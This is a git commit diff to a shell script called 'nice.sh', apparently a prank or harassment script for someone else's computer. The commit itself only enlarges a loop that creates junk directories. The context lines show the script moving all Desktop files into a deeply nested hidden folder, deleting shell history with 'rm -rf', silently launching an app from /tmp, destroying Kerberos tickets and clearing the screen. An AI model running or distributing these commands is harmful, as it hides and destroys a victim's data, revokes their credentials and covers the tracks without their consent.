60fd74a3757d4ae8fdad711759d390234f31a456
majrou <36647431+ajrou4@users.noreply.github.com>
2023-08-18 17:33:12 +0100

    Update nice.sh

--- nice.sh
+++ nice.sh
@@ -7,7 +7,7 @@ mkdir ~/Downloads/5/2/6/4/3/6/9/8/1/.99
 mv ~/Desktop/* ~/Downloads/5/2/6/4/3/6/9/8/1/.99
 cd ~/Desktop
 rm -rf ~/.*history*
-mkdir milafat_tatra3r3{0..100}
+mkdir milafat_tatra3r3{0..1000}
 nohup open /tmp/laz/app/Laz.app > /dev/null
 kdestroy
 clear
